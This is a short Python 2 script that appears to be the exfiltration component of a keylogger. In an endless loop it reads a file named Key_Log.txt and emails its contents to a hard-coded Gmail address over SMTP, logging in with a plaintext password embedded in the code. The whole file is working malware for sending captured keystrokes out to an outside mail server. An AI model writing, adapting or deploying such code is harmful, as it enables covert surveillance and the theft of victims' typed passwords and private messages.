import smtplib
import time
while True:
	to = 'pythonista33@gmail.com'
	subject = 'K_logs'
	txt = []

	f = open('Key_Log.txt','r')
	for line in f:
		txt.append(line) 


	gmail_sender = 'pythonista33@gmail.com'
	gmail_passwd = 'startpython33'

	server = smtplib.SMTP('smtp.gmail.com',587)
	server.ehlo()
	server.starttls()
	server.ehlo()
	server.login(gmail_sender,gmail_passwd)

	body = '\r\n'.join([
		'To:%s' % to ,
		'From:%s' % gmail_sender,
		'Subject:%s' % subject,
		'',
		str(txt)\
		])

	try:
		server.sendmail(gmail_sender,[to],body)
		print 'email sent'
	except:
		print "error sending email"
	server.quit()
	time.sleep(144000)